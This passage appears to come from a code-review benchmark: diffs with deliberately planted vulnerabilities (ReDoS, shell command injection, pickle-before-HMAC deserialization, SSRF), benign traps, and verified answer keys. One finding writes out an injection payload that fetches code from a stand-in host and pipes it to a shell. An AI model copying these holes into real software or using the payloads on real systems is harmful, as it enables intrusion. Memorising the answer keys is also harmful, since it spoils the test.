-        window = qs[offset : offset + page_size]
+        window = qs[offset : offset + page_size]
         total = qs.count()
 
         data = OrderSerializer(window, many=True).data
         return Response({"results": data, "total": total, "page": page})
diff --git a/api/orders/export.py b/api/orders/export.py
new file mode 100644
index 0000000..c8a2f5e
--- /dev/null
+++ b/api/orders/export.py
@@ -0,0 +1,52 @@
+import csv
+import io
+
+from django.http import HttpResponse
+from rest_framework.decorators import api_view, permission_classes
+from rest_framework.permissions import IsAuthenticated
+
+from .models import Order
+
+EXPORT_COLUMNS = ["id", "customer", "total", "currency", "status", "created_at"]
+
+
+def _serialize_row(order):
+    return [
+        order.id,
+        order.customer.name,
+        f"{order.total:.2f}",
+        order.currency,
+        order.status,
+        order.created_at.isoformat(),
+    ]
+
+
+@api_view(["GET"])
+@permission_classes([IsAuthenticated])
+def export_orders_csv(request):
+    """Download all completed orders for the merchant as a CSV file.
+
+    Used by the finance team's monthly reconciliation job. The optional
+    ``since`` query param narrows the window; when omitted we export the
+    merchant's full completed-order history.
+    """
+    qs = (
+        Order.objects.filter(merchant=request.user.merchant, status="completed")
+        .select_related("customer")
+        .order_by("-created_at")
+    )
+
+    since = request.query_params.get("since")
+    if since:
+        qs = qs.filter(created_at__gte=since)
+
+    orders = list(qs)
+
+    buffer = io.StringIO()
+    writer = csv.writer(buffer)
+    writer.writerow(EXPORT_COLUMNS)
+    for order in orders:
+        writer.writerow(_serialize_row(order))
+
+    response = HttpResponse(buffer.getvalue(), content_type="text/csv")
+    response["Content-Disposition"] = 'attachment; filename="orders.csv"'
+    return response
```
</details>

### domain: Backend web service — Python/Flask user-profile input validation (PUT /profile endpoint validating user-submitted email and website fields)
**planted bugs:**
- `redos-email-local-part` [high/catastrophic-regex-backtracking (ReDoS, CPU/time exhaustion)] @ app/validators.py — _EMAIL_RE / validate_email(); pattern fragment ([\w.+-]+)+ — The email local-part is matched by ([\w.+-]+)+ — a quantified group whose inner class also ends in a quantifier, with NO required delimiter between iterations. Because a run of word characters can be partitioned into successive (inner +)(outer +) groups in exponentially many ways, any input that satisfies the local part but then fails the rest of the pattern (no '@', or a trailing character outside the class) forces the engine to explore ~2^n partitions before declaring no match. This value comes straight from attacker-controlled request JSON (data.get('email')). The len(addr) > 254 guard is a false comfort: exponential blowup is reached well under 254 characters.
  - なぜ本物: Empirically confirmed with Python's re: input 'a'*n + '!' (word chars, no @, trailing invalid char) took 0.26s at n=23, 4.2s at n=27, and 66.8s at n=31 — roughly 16x per 4 extra characters. A single ~40-char payload hangs a worker for hours; a handful of concurrent PUT /profile requests (each < 50 bytes) pins every CPU/worker and takes the service down. Classic (X+)+ exponential ReDoS on a live request path.
**benign traps:**
- @ app/validators.py — _URL_RE, fragment ([a-z0-9-]+\.)+[a-z]{2,} — A quantified group with an inner quantifier, ([a-z0-9-]+\.)+ — visually the same 'nested +' shape as the vulnerable email regex, so a reviewer pattern-matching on structure may flag it as a second ReDoS on user input. (なぜOK: Each repetition of the group MUST end in a literal '.', and '.' is not in the inner character class [a-z0-9-]. That mandatory delimiter makes every iteration boundary unambiguous, so there is exactly one way to partition the input — the match is linear, not exponential. Verified: a 40,001-character hostile input matched in ~0.4ms. The identical construct appears (safely) in the email host part ([\w-]+\.)+; only the delimiter-free local part is dangerous.)
- @ app/validators.py — _CONTROL_RE = re.compile(r"[\x00-\x1f\x7f]") used in validate_website() — A newly added regex run directly against attacker-controlled input (the website URL), which can trip a reflexive 'regex + user input = ReDoS' flag. (なぜOK: It is a single character class with no quantifier and no grouping — .search() is strictly O(n) with no backtracking possible. It is a legitimate control-character reject filter and cannot exhibit pathological behavior on any input.)
- @ app/routes/profile.py — request.get_json(silent=True) and email/website treated as optional (`if email and ...`) — Validation is skipped when the field is empty/absent, which can look like a validation-bypass gap where malformed data slips through. (なぜOK: Empty email/website are intentionally optional profile fields; save_profile receives '' rather than an invalid value, and non-empty values are still fully validated. get_json(silent=True) or {} safely yields an empty dict on malformed bodies instead of raising. No correctness or security defect.)

<details><summary>diff</summary>

```diff
diff --git a/app/validators.py b/app/validators.py
index 3f1a2b0..b7c9e14 100644
--- a/app/validators.py
+++ b/app/validators.py
@@ -1,11 +1,37 @@
 import re
 
 MAX_DISPLAY_NAME = 64
+MAX_EMAIL_LEN = 254
 
 _DISPLAY_NAME_RE = re.compile(r"^[\w .'-]{1,64}$", re.UNICODE)
+_CONTROL_RE = re.compile(r"[\x00-\x1f\x7f]")
+
+# Local part allows the usual set of characters; host is one or more
+# dot-separated labels followed by a 2+ character TLD. Anchored both ends.
+_EMAIL_RE = re.compile(r"^([\w.+-]+)+@([\w-]+\.)+[a-z]{2,}$", re.IGNORECASE)
+
+# Scheme optional; host is dot-separated labels; optional path component.
+_URL_RE = re.compile(
+    r"^(https?://)?([a-z0-9-]+\.)+[a-z]{2,}(/[^\s]*)?$",
+    re.IGNORECASE,
+)
 
 
 def validate_display_name(name: str) -> bool:
     return bool(_DISPLAY_NAME_RE.match(name))
+
+
+def validate_email(addr: str) -> bool:
+    # Reject anything absurdly long before touching the regex.
+    if not addr or len(addr) > MAX_EMAIL_LEN:
+        return False
+    return bool(_EMAIL_RE.match(addr))
+
+
+def validate_website(url: str) -> bool:
+    if _CONTROL_RE.search(url):
+        return False
+    return bool(_URL_RE.match(url))
diff --git a/app/routes/profile.py b/app/routes/profile.py
index a10f4c8..e52bd39 100644
--- a/app/routes/profile.py
+++ b/app/routes/profile.py
@@ -1,6 +1,10 @@
 from flask import Blueprint, request, jsonify, g
 
-from app.validators import validate_display_name
+from app.validators import (
+    validate_display_name,
+    validate_email,
+    validate_website,
+)
 from app.db import save_profile
 
 bp = Blueprint("profile", __name__)
@@ -12,8 +16,21 @@ def update_profile():
     data = request.get_json(silent=True) or {}
     display_name = (data.get("display_name") or "").strip()
 
     if not validate_display_name(display_name):
         return jsonify(error="invalid display name"), 400
 
-    save_profile(g.user_id, display_name=display_name)
+    email = (data.get("email") or "").strip()
+    if email and not validate_email(email):
+        return jsonify(error="invalid email"), 400
+
+    website = (data.get("website") or "").strip()
+    if website and not validate_website(website):
+        return jsonify(error="invalid website"), 400
+
+    save_profile(
+        g.user_id,
+        display_name=display_name,
+        email=email,
+        website=website,
+    )
     return jsonify(ok=True)
```
</details>

## 独立検証で確定した正解(verify)

### verify #1 (usable=True)
- notes: Diff is coherent and reviewable: a celery task generating video thumbnails via ffmpeg/ffprobe, plus a Flask route to enqueue it. Verified the planted critical command-injection bug is real, exactly as described, and both benign traps are genuinely safe. Found one additional real bug the author's ground truth omitted: the user-controlled `resolution` field is spliced unsanitized into the output filename/path, enabling path traversal in the file the ffmpeg process writes to (independent of the shell-injection vector, since it affects the argument that gets shlex.quote()'d — quoting prevents shell metacharacter injection there but does not prevent `..`-based traversal in the resulting path).
- `cmd-injection-1` [critical/os-command-injection] @ app/tasks/media.py:53-58, generate_thumbnail — cmd f-string executed via subprocess.run(cmd, shell=True) — Confirmed as described. `timestamp` and `resolution` come straight from the untrusted JSON body in create_thumbnail (app/api/media_routes.py) through Celery's generate_thumbnail.delay(...) into the f-string cmd = f"ffmpeg -y -i {shlex.quote(input_path)} -ss {timestamp} -vframes 1 -s {resolution} {shlex.quote(output_path)}" run with shell=True. Only input_path and output_path are shlex.quote()'d; timestamp and resolution are not. An authenticated caller can POST e.g. {"resolution": "320x240; curl http://evil/x|sh #"} to the /api/media/videos/<id>/thumbnail endpoint to get arbitrary shell command execution on the celery worker with the app's privileges. Severity and location match the author's claim; confirmed real and correctly classified as critical.

### verify #2 (usable=True)
- notes: Diff is coherent and reviewable: a new CookieSessionStore (stateless, signed session cookie) replacing a plain JSON cookie session in SessionMiddleware. Verified the planted critical bug by reading the code directly: in CookieSessionStore.loads(), `data = pickle.loads(payload)` executes before `hmac.compare_digest(mac, self._mac(payload))`. Since the cookie is fully attacker-controlled (read from request.cookies in SessionMiddleware.load_session with no other validation), an attacker can submit a cookie whose payload is a malicious pickle stream (e.g. `__reduce__` invoking os.system/subprocess) with arbitrary trailing 32 bytes as the "mac" — pickle.loads executes the gadget during deserialization, before the signature is ever checked, giving unauthenticated RCE on any request carrying a `sid` cookie. Confirmed correct as stated: class unsafe-deserialization, severity critical, location app/sessions.py CookieSessionStore.loads().

All three benign traps checked out as genuinely benign: (1) MD5 used only for a non-security ETag/cache fingerprint, explicitly commented as not security-sensitive — fine. (2) yaml.safe_load in _load_ttl reads a server-side config file and uses the safe loader (cannot instantiate arbitrary objects) — correct and safe. (3) the broad `except Exception: return {}` in load_session degrades gracefully for a malformed/untrusted client-supplied cookie, and does not swallow/rescue the pickle bug (which fires before this except could catch anything meaningful, and would raise inside the try/except as generic corruption anyway, still resulting in either a crash-path exception or, worse, code execution before any exception is raised) — reasonable defensive handling, not a defect.

I found one additional real, planted-bug-worthy issue the author's list omitted: CookieSessionStore.__init__ calls `self._ttl = _load_ttl()` and stores a TTL, but `_ttl` is never referenced again anywhere in dumps() or loads() — no expiration timestamp is embedded in the payload and no expiry check occurs on load. This means session cookies never expire regardless of the configured `session.ttl_seconds`, contradicting the apparent intent (and the module docstring's framing of TTL-bounded sessions). This is a real, distinct, medium-severity logic bug (dead/unused state, missing feature enforcement) that is independent from the RCE bug, so I added it to ground truth.
- `pickle-before-verify` [critical/unsafe-deserialization] @ app/sessions.py, CookieSessionStore.loads() — `data = pickle.loads(payload)` runs before `hmac.compare_digest(mac, self._mac(payload))` — The session cookie value is fully attacker-controlled (read straight from request.cookies in SessionMiddleware.load_session, with only a base64 decode in between). loads() splits the decoded blob into payload and trailing 32-byte MAC, then calls pickle.loads(payload) BEFORE verifying the HMAC. Since pickle deserialization can execute arbitrary code via crafted __reduce__/__reduce_ex__ objects, an attacker can submit a cookie whose payload is a malicious pickle stream with any 32 bytes appended as a fake MAC; the RCE gadget fires during pickle.loads, and the subsequent compare_digest check never gets a chance to reject the forgery because the damage is already done. This is reachable on every request bearing a `sid` cookie, giving unauthenticated remote code execution.
- `ttl-loaded-but-never-enforced` [medium/logic-error] @ app/sessions.py, CookieSessionStore.__init__ (`self._ttl = _load_ttl()`) — `_ttl` is never read anywhere in dumps()/loads() — The constructor loads a session TTL from config into self._ttl, and the module's stated purpose implies TTL-bounded sessions, but no expiration timestamp is ever embedded into the serialized payload in dumps(), and loads() never checks age/expiry against self._ttl. As a result, a valid signed session cookie remains accepted forever (until the secret key is rotated), regardless of the configured session.ttl_seconds — sessions effectively never expire, silently defeating the apparent TTL feature/expectation set by configuration and the module docstring.

### verify #3 (usable=True)
- notes: Read the full diff independently. The core planted bug is real and well-described: /preview validates only the URL scheme (http/https) and never checks the destination host against a private/loopback/link-local blocklist or allowlist, then feeds the raw URL straight into axios.get inside fetchMeta. This is a textbook SSRF letting an authenticated user hit http://169.254.169.254/latest/meta-data/... (cloud metadata credential theft), internal services (127.0.0.1, 10.x, etc.), or use response/error/timing differences to port-scan the internal network. maxRedirects:3 compounds it since even a future allowlist-only-on-input-URL fix could be bypassed by a 3xx redirect to an internal target. Severity critical is justified given the credential-theft blast radius on a typical cloud deployment. I did not find any additional distinct planted-class bug beyond this SSRF (the redirect-bypass point is correctly folded into the same finding rather than treated as separate).

All four benign traps check out on inspection:
1. Auth-bypass trap: router.use(requireAuth) is mounted in src/routes/index.js immediately before router.use('/', preview), and after the /health mount — so /preview genuinely requires a valid session; only /health is public. Confirmed benign (though it correctly does not make the SSRF itself less severe, just means it requires authentication to trigger).
2. Log-injection trap: req.log.warn({ err: err.message, url: parsed.href }, 'preview fetch failed') passes the URL as a bound field in a pino-style structured logger call, not string-concatenated into a template — no forged log lines. Confirmed benign.
3. JSON.parse-from-cache trap: the only writer to that cache key is JSON.stringify(meta) where meta is a plain 3-string-field object built by the server from cheerio-extracted values; nothing attacker-controlled ever gets written directly as raw cache content, and JSON.parse of JSON.stringify output of a plain object doesn't enable prototype pollution or code execution. Confirmed benign.
4. validateStatus override trap: accepting 2xx/3xx (with maxRedirects handling the 3xx) while non-2xx/3xx still throws and is caught by the route's try/catch is a normal, safe pattern for a fetch-and-parse helper. Confirmed benign.

No changes needed to severity/class/location of the planted bug or to the benign trap list; both are accurate as submitted.
- `ssrf-no-host-allowlist` [critical/SSRF (server-side request forgery)] @ src/routes/preview.js lines 15-24 (URL validation only checks protocol) feeding src/lib/fetchMeta.js line 8 (axios.get(targetUrl)) — The /preview handler parses the user-supplied url and validates only that the scheme is http/https; it performs no check on the destination host/IP (no allowlist, no blocklist of private/loopback/link-local/metadata ranges, no DNS-resolved-IP check) before passing parsed.href into fetchMeta(), which does axios.get on it directly. An authenticated user can request http://169.254.169.254/latest/meta-data/iam/security-credentials/ to steal cloud instance credentials, or hit http://127.0.0.1:<port>/ and http://10.x.x.x/ to reach internal-only services, and can use response content/error/timing differences to port-scan the internal network. maxRedirects:3 makes any future input-URL-only allowlist insufficient too, since a whitelisted external host could 302 to an internal target and axios would follow it without re-validating.

### verify #4 (usable=True)
- notes: test

### verify #5 (usable=True)
- notes: Diff is coherent and reviewable: a Django pagination cap bump (with an accompanying no-op re-added slice line) plus a new CSV export endpoint. Verified independently against the diff text.\n\nThe planted "unbounded-export" bug is real and correctly characterized: `export_orders_csv` calls `orders = list(qs)` over an unfiltered-by-default, unpaginated queryset (the `since` param is optional, defaulting to the merchant's entire completed-order history), then builds the full CSV in an in-memory `io.StringIO` before returning it in one `HttpResponse`. No `.iterator()`, no chunking, no `StreamingHttpResponse`, no row cap. For a merchant with a large completed-order history this holds two full in-memory copies of the dataset (ORM objects + serialized CSV text) and can OOM or hang the worker process on a single authenticated request with no unusual input — high severity resource-exhaustion is justified.\n\nAll three benign traps hold up: (1) MAX_PAGE_SIZE 100->500 is still hard-clamped by `_clamp_page_size` and still turns into a bounded SQL LIMIT/OFFSET slice, so raising the cap 5x is not itself a bug; (2) `.select_related(\"customer\")` is a correctness/perf fix (avoids N+1 for `order.customer.name`) and doesn't change row count, so it's not part of the memory issue; (3) the `window = qs[offset : offset + page_size]` line appears as a remove+add in the hunk but the two lines are textually identical — a no-op diff artifact, not a behavior change.\n\nAdditional real bug found and added: `_serialize_row` writes `order.customer.name` and other fields directly into CSV cells with no sanitization against formula-injection (CWE-1236). Since customer name is attacker-influenceable end-user data and the doc-comment says this file is opened by the finance team (implying Excel/Sheets), a customer name starting with `=`, `+`, `-`, or `@` (e.g. `=HYPERLINK(...)` or a DDE payload) can execute a formula/command when the finance team opens the export in a spreadsheet app — a genuine, if narrower, security issue distinct from the memory-exhaustion bug. Rated medium: it requires attacker-controlled customer names to reach a spreadsheet client with formula execution enabled, so impact is real but conditional on downstream tooling, unlike the always-triggerable unbounded-memory bug.
- `unbounded-export` [high/resource-exhaustion] @ api/orders/export.py, export_orders_csv — `orders = list(qs)` and the full in-memory `io.StringIO` buffer — export_orders_csv materializes the merchant's entire completed-order history (unbounded when `since` is omitted, which is the default/common case) into a Python list via `list(qs)`, then serializes the whole CSV into an in-memory StringIO buffer before returning it as a single HttpResponse. No LIMIT, pagination, or streaming is used. A merchant with hundreds of thousands of completed orders can trigger a single authenticated GET request that holds two full copies of the dataset in RAM simultaneously, risking OOM or multi-minute blocking of the worker process, which affects all tenants served by that process. Should use StreamingHttpResponse with qs.iterator(chunk_size=...) writing rows incrementally.

### verify #6 (usable=True)
- notes: Diff is coherent and reviewable (a small, self-contained feature: adding a size-capped, retrying, allowlisted remote document fetcher to app/ingest.py, wired into app/worker.py). Both planted bugs are real and correctly characterized. I additionally found a real SSRF-via-redirect bug the author's list missed: the host allowlist check in fetch_remote_document only inspects the original URL's host before calling requests.get, but requests follows HTTP redirects by default (allow_redirects=True), so a response from an allowlisted host can 30x-redirect the fetch to an arbitrary disallowed host (e.g. an internal service or cloud metadata endpoint 169.254.169.254) and the code will still download and persist it — the allowlist is a security boundary that is trivially bypassed. All three benign traps hold up under scrutiny (trusted small config file read fully, zero-arg lru_cache has a fixed cache size of 1, and the retry loop is bounded and scoped to RequestException).
- `bug-1` [critical/unbounded-memory] @ app/ingest.py, fetch_remote_document — the io.BytesIO accumulation loop over resp.iter_content — Confirmed as described by the author. The only size guard before download is the advisory Content-Length response header (checked once, before the loop); the loop itself tallies nothing against MAX_DOWNLOAD_BYTES while writing every streamed chunk into an io.BytesIO. A server that omits Content-Length (chunked transfer-encoding) or lies about it can stream an arbitrarily large body that is fully buffered in RAM before build_document's len(content) check ever runs, causing an OOM. This is a remotely triggerable single-request DoS.
- `bug-2` [medium/resource-leak] @ app/ingest.py, fetch_remote_document / _get — resp (stream=True) is never closed on the DocumentTooLarge raise path, nor on failed retry attempts inside _get — Confirmed. When the declared Content-Length exceeds the limit, the function raises DocumentTooLarge immediately after obtaining resp, without calling resp.close() or using a context manager, leaving the pooled connection open. Similarly, inside _get's retry loop, if requests.get() succeeds but raise_for_status() raises (e.g. on a 5xx), the local resp object goes out of scope unclosed before the next retry attempt. Under sustained traffic hitting either path this exhausts the connection pool / file descriptors.
- `bug-3` [high/security-ssrf-redirect-bypass] @ app/ingest.py, fetch_remote_document — host allowlist check runs only on the pre-request URL, before calling _get/requests.get — The allowlist check (`host not in _allowed_hosts()`) is performed only against the hostname parsed from the caller-supplied url, once, before the HTTP request is made. _get calls requests.get(url, stream=True, timeout=timeout) with the library default allow_redirects=True, so if the allowed host responds with a 3xx redirect to a different host (including internal/private addresses such as a cloud metadata service at 169.254.169.254, or any other disallowed host), requests transparently follows it and returns the final response — the allowlist is never re-checked against the redirect target. The function then downloads and persists whatever that internal/arbitrary host returns, defeating the entire purpose of the allowlist as an SSRF guard. This is a real bug newly introduced by this diff (the allowlist mechanism itself is new here) and was not in the author's planted list.

### verify #7 (usable=True)
- notes: Diff is coherent and reviewable: adds email/website validators plus regexes and wires them into the profile update route. Verified empirically with Python's `re` engine (same engine Flask/CPython would use).\n\nPlanted bug confirmed as described and exploitable: _EMAIL_RE's local-part fragment `([\\w.+-]+)+` is a classic nested-quantifier ReDoS pattern (ambiguous partitioning with no separator inside the outer quantifier). Empirical timings on the actual compiled pattern `^([\\w.+-]+)+@([\\w-]+\\.)+[a-z]{2,}$` with input `'a'*n + '!'`: n=20 -> 0.066s, n=23 -> 0.51s, n=27 -> 8.3s, n=30 -> 66.2s — clean exponential blowup, matching the author's claim almost exactly (they reported ~0.26/4.2/66.8s at n=23/27/31). The len(addr) > 254 guard does not help since the explosion is already crippling at ~30 chars, far under the 254 cap. The route passes attacker-controlled `data.get('email')` directly into this validator on every profile-update request. Severity "high" is justified (single authenticated request can pin a worker for tens of seconds to minutes; a handful of concurrent requests can exhaust a worker pool) — I did not upgrade to critical since the endpoint appears to require an authenticated user (g.user_id), which is a mitigating factor, but the finding as classified by the author (high, catastrophic-regex-backtracking) is correct in class/severity/location.\n\nAll three benign traps confirmed genuinely benign:\n1. _URL_RE's `([a-z0-9-]+\\.)+` looks structurally similar (nested quantifier) but the mandatory literal '.' delimiter (not in the inner character class) makes iteration boundaries unambiguous — verified linear-time match (~0.4ms) against a 40,001-char adversarial string with no trailing match.\n2. _CONTROL_RE is a single unquantified character class run via .search() — trivially O(n), cannot backtrack pathologically.\n3. The `if email and ...` / `if website and ...` optional-field pattern is intentional (fields are optional profile attributes); get_json(silent=True) or {} safely handles malformed JSON bodies; non-empty values are still fully validated before save_profile.\n\nI checked for an additional bug: Python's `$` anchor (non-MULTILINE) matches immediately before a trailing newline, so in isolation validate_email('a@b.com\\n') and validate_website('a.com\\n') return True — verified this behavior empirically. However, in the actual route both email and website are `.strip()`-ed before being passed to the validators, which removes any trailing/leading whitespace including newlines, so this quirk is not reachable/exploitable through the code shown in this diff. I therefore did not add it as a ground-truth bug (not a real, triggerable defect in this diff), though a reviewer could reasonably leave it as a low-severity note about validator robustness if reused elsewhere without the strip() guard.\n\nNo other additional real bugs found on the changed lines.
- `redos-email-local-part` [high/catastrophic-regex-backtracking (ReDoS, CPU/time exhaustion)] @ app/validators.py — _EMAIL_RE / validate_email(); pattern fragment ([\w.+-]+)+ — The email local-part is matched by ([\w.+-]+)+, a quantified group whose inner class itself ends in a quantifier with no required separator between iterations. A run of word/dot/plus/hyphen characters that satisfies the local part but then fails the rest of the pattern (missing '@' or trailing invalid char) forces exponential-time backtracking. Verified empirically on the actual compiled regex: n=20->0.066s, n=23->0.51s, n=27->8.3s, n=30->66.2s for input 'a'*n+'!'. This value comes directly from attacker-controlled request JSON (data.get('email')), and the len(addr) > 254 guard does not help since the blowup is already severe at ~30 characters, well under the cap.

